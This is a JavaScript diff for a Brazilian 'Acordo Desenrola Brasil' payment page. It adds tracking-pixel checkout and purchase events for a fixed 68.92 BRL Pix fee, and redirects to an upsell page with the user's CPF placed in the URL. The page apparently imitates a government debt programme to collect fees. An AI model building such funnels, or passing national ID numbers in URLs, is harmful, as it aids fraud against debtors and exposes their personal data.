@@ -862,6 +862,13 @@ async function confirmarAcordo() {
     pagBtn.className = 'btn-pagamento';
     pagBtn.textContent = 'CONTINUAR PARA O PAGAMENTO';
     pagBtn.onclick = async function() {
+      if (typeof trackPixelEvent === 'function') {
+        trackPixelEvent('InitiateCheckout', {
+          value: 68.92,
+          currency: 'BRL',
+          content_name: 'Acordo Desenrola Brasil'
+        });
+      }
       unlockGlobalAudio();
       pagBtn.disabled = true;
       pagBtn.style.display = 'none';
@@ -1116,6 +1123,13 @@ function startMonitoringPix(transactionId) {
 }
 
 function mostrarSucessoPagamento() {
+  if (typeof trackPixelEvent === 'function') {
+    trackPixelEvent('Purchase', {
+      value: 68.92,
+      currency: 'BRL',
+      content_name: 'Acordo Desenrola Brasil'
+    });
+  }
   const pixCard = document.querySelector('.pix-card');
   if (pixCard) {
     pixCard.innerHTML = `
@@ -1137,7 +1151,16 @@ function mostrarSucessoPagamento() {
     `;
     pixCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
     setTimeout(() => {
-      window.location.href = '/upsell1';
+      if (typeof redirectPreservingParams === 'function') {
+        redirectPreservingParams('/upsell1', (dadosConsulta && dadosConsulta.cpf) ? { cpf: dadosConsulta.cpf } : undefined);
+      } else {
+        const dest = new URL('/upsell1', window.location.href);
+        if (dadosConsulta && dadosConsulta.cpf) dest.searchParams.set('cpf', dadosConsulta.cpf);
+        new URLSearchParams(window.location.search).forEach((v, k) => {
+          if (!dest.searchParams.has(k)) dest.searchParams.append(k, v);
+        });
+        window.location.href = dest.toString();
+      }
     }, 3000);
   }
 }
@@ -1225,6 +1248,14 @@ function naoSouEu() {
   autoScroll();
 
   setTimeout(() => {
-    window.location.href = 'consulta.html';
+    if (typeof redirectPreservingParams === 'function') {
+      redirectPreservingParams('consulta.html');
+    } else {
+      const dest = new URL('consulta.html', window.location.href);
+      new URLSearchParams(window.location.search).forEach((v, k) => {
+        if (!dest.searchParams.has(k)) dest.searchParams.append(k, v);
+      });
+      window.location.href = dest.toString();
+    }
   }, 2500);
 }
